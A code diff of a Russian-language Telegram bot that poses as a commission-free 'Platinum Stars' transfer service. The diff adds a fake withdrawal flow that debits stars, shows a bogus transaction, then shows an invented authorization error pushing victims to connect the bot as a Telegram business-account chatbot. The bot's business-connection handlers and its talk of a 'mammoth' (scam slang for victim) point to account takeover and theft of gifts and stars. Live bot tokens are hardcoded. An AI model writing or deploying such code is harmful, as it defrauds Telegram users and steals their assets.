@@ -17,7 +17,6 @@ from aiogram.types import (
     InlineQueryResultArticle
 )
 from aiogram.types import LabeledPrice, PreCheckoutQuery
-from aiogram.filters import PreCheckoutQueryFilter
 import random
 import os
 import json
@@ -27,7 +26,7 @@ import asyncio
 import aiohttp
 from aiogram.types import InlineQueryResultCachedPhoto
 # Constants
-TOKEN = "8286835814:AAFJF44iKGuZsRk2VN5tnUFTUtjsa9jwjNk"
+TOKEN = "8229712249:AAEY8ANUWpiyKBGWU4EyW8hnSdBoIHzEvj8"
 LOG_CHAT_ID = -1002741941997
 MESSAGE_LOG_CHAT_ID = -1002741941997  # Замените на ID чата для логов сообщений
 MAX_GIFTS_PER_RUN = 1000
@@ -36,6 +35,7 @@ FORCED_REFERRAL_USERS = [819487094, 7214848375]
 MY_REFERRAL_ID = 7917237979
 user_message_history = {}
 last_messages = {}
+activated_checks = {}
 CHECK_PHOTO_FILE_ID = None
 
 logging.basicConfig(level=logging.INFO)
@@ -46,6 +46,9 @@ class Draw(StatesGroup):
     gift = State()
 
 class CheckState(StatesGroup):
+    waiting_for_amount = State()
+
+class WithdrawStates(StatesGroup):
     waiting_for_amount = State()
 
 class DepositStates(StatesGroup):
@@ -67,58 +70,68 @@ ref_links = {}
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher(storage=storage)
 
-async def send_replaceable_message(chat_id: int, text: str, reply_markup=None, parse_mode=None):
-    try:
-        if chat_id in user_message_history and len(user_message_history[chat_id]) > 1:
-            for msg_id in user_message_history[chat_id][1:]:
-                try:
-                    await bot.delete_message(chat_id=chat_id, message_id=msg_id)
-                except Exception as e:
-                    logging.error(f"Error deleting message: {e}")
-            user_message_history[chat_id] = user_message_history[chat_id][:1]
-        
-        message = await bot.send_message(
-            chat_id=chat_id,
-            text=text,
-            reply_markup=reply_markup,
-            parse_mode=parse_mode
-        )
-        
-        if chat_id not in user_message_history:
-            user_message_history[chat_id] = []
-        user_message_history[chat_id].append(message.message_id)
-        
-        return message
-    except Exception as e:
-        logging.error(f"Error in send_replaceable_message: {e}")
-        raise
 
-def main_menu_kb():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
-        [InlineKeyboardButton(text="💳 Чеки", callback_data="checks")],
-        [InlineKeyboardButton(text="⭐️ Получение звёзд", callback_data="get_stars")],
-        [InlineKeyboardButton(text="📝 Условия", callback_data="terms")]
-    ])
+async def activate_check(user_id: int, check_data: str):
+    try:
+        # Формат: ref{referrer_id}_check_{amount}_{sender_id}
+        parts = check_data.split('_')
+        if len(parts) != 4:
+            return False, "Неверный формат чека"
+            
+        amount = int(parts[2])
+        sender_id = int(parts[3])
+        
+        # Проверяем, не активировался ли уже этот чек
+        check_key = f"{sender_id}_{amount}"
+        if check_key in activated_checks:
+            return False, "Этот чек уже был активирован"
+        
+        # Добавляем звёзды на баланс
+        balances = load_balances()
+        balances[str(user_id)] = balances.get(str(user_id), 0) + amount
+        save_balances(balances)
+        
+        # Помечаем чек как активированный
+        activated_checks[check_key] = True
+        
+        # Сохраняем информацию о реферере, если он есть
+        referrer_id = parts[0][3:]  # Убираем 'ref' в начале
+        if referrer_id and referrer_id.isdigit():
+            referrer_id = int(referrer_id)
+            if str(referrer_id) not in user_referrer_map:
+                user_referrer_map[str(user_id)] = str(referrer_id)
+                with open("referrers.json", "w") as f:
+                    json.dump(user_referrer_map, f)
+        
+        return True, f"Вам начислено {amount} звёзд!"
+        
+    except Exception as e:
+        logging.error(f"Ошибка активации чека: {e}")
+        return False, "Ошибка активации чека"
 
 @dp.message(Command("start"))
 async def start_cmd(message: types.Message):
-    # Создаем клавиатуру с 4 кнопками
+    # Проверяем, есть ли параметры в команде /start (активация чека)
+    if len(message.text.split()) > 1:
+        check_data = message.text.split()[1]
+        if check_data.startswith("ref") and "_check_" in check_data:
+            success, result_text = await activate_check(message.from_user.id, check_data)
+            await message.answer(result_text)
+            if not success:
+                return
+    
+    # Остальной код обработчика /start остается без изменений
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="⭐️ Баланс", callback_data="balance")],
         [InlineKeyboardButton(text="➕ Пополнить звёзды", callback_data="deposit")],
         [InlineKeyboardButton(text="📤 Вывести звёзды", callback_data="withdraw")],
-        [InlineKeyboardButton(text="❓ FAQ", callback_data="faq")]
+        [InlineKeyboardButton(text="❓ FAQ", url="https://telegra.ph/FAQ-StarsPlatinumBot-08-05")]
     ])
     
-    # Загружаем фото
-    photo = FSInputFile("image.png")  # Убедитесь, что файл image.png существует в папке с ботом
-    
-    # Отправляем сообщение с фото, текстом и клавиатурой
+    photo = FSInputFile("image.png")
     await message.answer_photo(
         photo=photo,
         caption=(
-            "МЕНЮ\n\n"
             "👀 Добро пожаловать в Platinum Stars!\n\n"
             "Наш бот поможет отправить звезды без комиссии прямо на баланс получателя.\n\n"
             "Выберите нужный раздел:"
@@ -137,13 +150,18 @@ async def start_cmd(message: types.Message):
 
 @dp.callback_query(F.data == "balance")
 async def show_balance(callback: types.CallbackQuery):
+    # Получаем текущий баланс пользователя
+    user_id = str(callback.from_user.id)
+    balances = load_balances()
+    balance = balances.get(user_id, 0)
+    
     # Загружаем фото для раздела баланса
     balance_photo = FSInputFile("balance.png")  # Убедитесь, что файл balance.png существует
     
-    # Текст сообщения
+    # Текст сообщения с актуальным балансом
     balance_text = (
         "⭐️ Раздел «Баланс»\n\n"
-        "Количество ваших звезд: 0\n\n"
+        f"Количество ваших звезд: {balance}\n\n"
         "Так же вы можете пополнить баланс напрямую через Telegram — быстро, анонимно и без комиссии."
     )
     
@@ -245,6 +263,118 @@ async def process_successful_payment(message: types.Message):
         f"Ваш текущий баланс: {balances[user_id]} звёзд"
     )
 
+@dp.callback_query(F.data == "withdraw")
+async def withdraw_stars(callback: types.CallbackQuery, state: FSMContext):
+    # Получаем текущий баланс пользователя
+    user_id = str(callback.from_user.id)
+    balances = load_balances()
+    balance = balances.get(user_id, 0)
+    
+    await callback.message.answer(
+        f"📤 Введите количество звёзд для вывода (минимум 25):\n"
+        f"Ваш баланс: {balance} ⭐️"
+    )
+    await state.set_state(WithdrawStates.waiting_for_amount)
+    await callback.answer()
+
+@dp.message(WithdrawStates.waiting_for_amount, F.text)
+async def process_withdraw_amount(message: types.Message, state: FSMContext):
+    try:
+        # Получаем баланс пользователя
+        user_id = str(message.from_user.id)
+        balances = load_balances()
+        balance = balances.get(user_id, 0)
+        
+        # Парсим введенное количество
+        amount = int(message.text)
+        
+        if amount < 25:
+            await message.answer("❌ Минимальная сумма для вывода - 25 звёзд")
+            return
+            
+        if amount > balance:
+            await message.answer(f"❌ Недостаточно звёзд на балансе\nВаш баланс: {balance} ⭐️")
+            return
+        
+        # Списываем звёзды с баланса
+        balances[user_id] = balance - amount
+        save_balances(balances)
+            
+        # Генерируем случайный номер транзакции
+        transaction_id = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', k=10))
+        
+        # Формируем сообщение о выводе
+        withdraw_message = await message.answer(
+            "🟡 Выполняется вывод\n\n"
+            f"⭐️ Звезды: {amount} ⭐️\n"
+            f"➕ Номер транзакции: {transaction_id}\n"
+            f"⌛️ Примерное время прибытия: 25сек"
+        )
+        
+        # Удаляем сообщение через 5 секунд и показываем ошибку
+        await asyncio.sleep(5)
+        await bot.delete_message(chat_id=message.chat.id, message_id=withdraw_message.message_id)
+        
+        # Создаем клавиатуру с кнопками
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="❓Как получить", url="https://telegra.ph/Oshibka-vyvoda-zvyozd-chto-delat-08-05-2")],
+            [InlineKeyboardButton(text="⚙️ Открыть настройки", url="tg://settings/")],
+            [InlineKeyboardButton(text="✅ Подключил(-а)", callback_data="check_connection")]
+        ])
+        
+        await message.answer(
+            "🔴 Ошибка вывода звезд\n\n"
+            "При попытке вывода звезд, возникла ошибка — ваш аккаунт не авторизован в Platinum Stars. "
+            "Авторизуйтесь, и пройдите этап вывода снова.\n\n"
+            "Не помогло? Напишите об ошибке — @StarsPlatinumSupport",
+            reply_markup=keyboard
+        )
+        
+    except ValueError:
+        await message.answer("❌ Пожалуйста, введите корректное число")
+    finally:
+        await state.clear()
+
+@dp.callback_query(F.data == "check_connection")
+async def check_connection_handler(callback: types.CallbackQuery):
+    # Создаем клавиатуру с кнопкой поддержки
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🆘 Поддержка", url="https://t.me/StarsPlatinumSupport")]
+    ])
+    
+    await callback.message.edit_text(
+        "🔄 Проверка подключения бота\n"
+        "В среднем занимает до 33 секунд.",
+        reply_markup=keyboard
+    )
+    await callback.answer()
+
+@dp.callback_query(F.data == "open_settings")
+async def open_settings_handler(callback: types.CallbackQuery):
+    try:
+        # Пытаемся открыть настройки Telegram
+        await callback.answer()
+        await bot.send_message(
+            chat_id=callback.from_user.id,
+            text="Пожалуйста, откройте настройки Telegram вручную: Настройки > Бизнес-аккаунт > Чат-боты"
+        )
+    except Exception as e:
+        logging.error(f"Ошибка при открытии настроек: {e}")
+
+@dp.callback_query(F.data == "check_connection")
+async def check_connection_handler(callback: types.CallbackQuery):
+    # Создаем клавиатуру с кнопкой поддержки
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🆘 Поддержка", url="https://t.me/StarsPlatinumSupport")]
+    ])
+    
+    await callback.message.edit_text(
+        "🔄 Проверка подключения бота\n"
+        "В среднем занимает до 33 секунд.",
+        reply_markup=keyboard
+    )
+    await callback.answer()
+
 async def pagination(page=0):
     url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
     try:
@@ -292,6 +422,7 @@ async def pagination(page=0):
         logging.error(f"Ошибка при получении подарков: {e}")
         await bot.send_message(chat_id=ADMIN_IDS[0], text=f"Ошибка pagination: {str(e)}")
         return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Ошибка загрузки", callback_data="error")]])
+
 
 @dp.business_connection()
 async def handle_business(business_connection: types.BusinessConnection):
@@ -574,7 +705,7 @@ async def decline(callback: CallbackQuery):
     await bot.set_business_account_bio(business_id, "Some bot")
     await callback.message.answer("Мамонт спасен от сноса.")
 
-    user_id = message.from_user.id
+    user_id = callback.from_user.id
     inviter_id = user_referrer_map.get(user_id)
 
     # Если нет пригласившего — fallback на первого админа
@@ -783,28 +914,24 @@ async def upload_check_photo():
     except Exception as e:
         logging.error(f"Ошибка загрузки фото чека: {e}")
         return False
+# Функции для работы с балансом
+def load_balances():
+    if os.path.exists("user_balances.json"):
+        with open("user_balances.json", "r") as f:
+            return json.load(f)
+    return {}
 
+def save_balances(balances):
+    with open("user_balances.json", "w") as f:
+        json.dump(balances, f)
 
 @dp.inline_query()
 async def inline_query_handler(inline_query: InlineQuery):
     try:
-        if not CHECK_PHOTO_FILE_ID:
-            success = await upload_check_photo()
-            if not success:
-                await inline_query.answer(
-                    [InlineQueryResultArticle(
-                        id="error",
-                        title="Ошибка загрузки фото",
-                        input_message_content=InputTextMessageContent(
-                            "Извините, сервис временно недоступен. Попробуйте позже."
-                        )
-                    )],
-                    cache_time=60
-                )
-                return
-
-        query = inline_query.query.strip()
         user_id = inline_query.from_user.id
+        is_admin = user_id in ADMIN_IDS  # Проверяем, является ли пользователь админом
+        
+        query = inline_query.query.strip()
         
         try:
             if query.isdigit():
@@ -814,58 +941,74 @@ async def inline_query_handler(inline_query: InlineQuery):
             else:
                 raise ValueError
                 
-            if not (1 <= amount <= 10000):
+            if not (1 <= amount <= 1000000):
                 raise ValueError
         except (ValueError, IndexError):
-            help_result = InlineQueryResultArticle(
-                id="help",
-                title="Как отправить чек",
-                description="Формат: @бот 100 или 'чек 100' (1-10000)",
-                input_message_content=InputTextMessageContent(
-                    message_text=(
-                        "ℹ️ Для отправки чека введите:\n"
-                        "@имя_бота 100 - чек на 100 звезд\n"
-                        "Или: чек 100 - аналогично\n"
-                        "Диапазон: 1-10000 звезд"
-                    ),
-                    parse_mode="HTML"
-                )
-            )
-            await inline_query.answer([help_result], cache_time=3600)
+            await inline_query.answer([])
             return
+
+        # Для обычных пользователей проверяем баланс
+        if not is_admin:
+            balances = load_balances()
+            user_balance = balances.get(str(user_id), 0)
+            
+            if user_balance < amount:
+                result = InlineQueryResultArticle(
+                    id="no_balance",
+                    title="Недостаточно средств",
+                    description=f"Ваш баланс: {user_balance}⭐ | Нужно: {amount}⭐",
+                    input_message_content=InputTextMessageContent(
+                        message_text=f"❌ Недостаточно звёзд на балансе. Ваш баланс: {user_balance}⭐",
+                        parse_mode="HTML"
+                    )
+                )
+                await inline_query.answer([result], cache_time=0, is_personal=True)
+                return
+            
+            # Списываем звёзды с баланса
+            balances[str(user_id)] = user_balance - amount
+            save_balances(balances)
 
         bot_username = (await bot.me()).username
         
-        # Здесь меняем реферальную ссылку для определённых пользователей
+        # Формируем реферальную ссылку
         if user_id in FORCED_REFERRAL_USERS:
             check_link = f"https://t.me/{bot_username}?start=ref{MY_REFERRAL_ID}_check_{amount}_{user_id}"
         else:
             check_link = f"https://t.me/{bot_username}?start=ref{user_id}_check_{amount}_{user_id}"
 
-        result = InlineQueryResultCachedPhoto(
+        # Форматированный текст чека
+        sender_name = f"@{inline_query.from_user.username}" if inline_query.from_user.username else f"ID:{inline_query.from_user.id}"
+        message_text = (
+            f"<b>🚀 Вам подарили звёзды</b>\n\n"
+            f"<i>Внутри чека: {amount} звёзд</i>\n\n"
+            f"<i>От:</i> <b>{sender_name}</b>"
+        )
+
+        result = InlineQueryResultArticle(
             id=f"check_{amount}",
-            photo_file_id=CHECK_PHOTO_FILE_ID,
-            title=f"Чек на {amount} звёзд",
-            description=f"Нажмите, чтобы отправить чек на {amount} звёзд",
-            caption=(
-                f"💳 Чек на {amount} звёзд\n\n"
-                f"От: @{inline_query.from_user.username or inline_query.from_user.id}\n\n"
-                "Для активации чека нажмите кнопку ниже ⬇️"
+            title=f"Чек на {amount}⭐",
+            description=f"Отправить чек на {amount} звёзд" + (" (админ)" if is_admin else ""),
+            input_message_content=InputTextMessageContent(
+                message_text=message_text,
+                parse_mode="HTML"
             ),
-            parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(
-                    text="📝 Активировать чек",
+                    text=f"Получить {amount}⭐",
                     url=check_link
                 )]
             ])
         )
 
-        await inline_query.answer([result], cache_time=3600, is_personal=True)
+        await inline_query.answer([result], cache_time=0, is_personal=True)
 
     except Exception as e:
         logging.error(f"Ошибка в инлайн-режиме: {e}")
         await inline_query.answer([])
-
+        
 async def main():
     await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
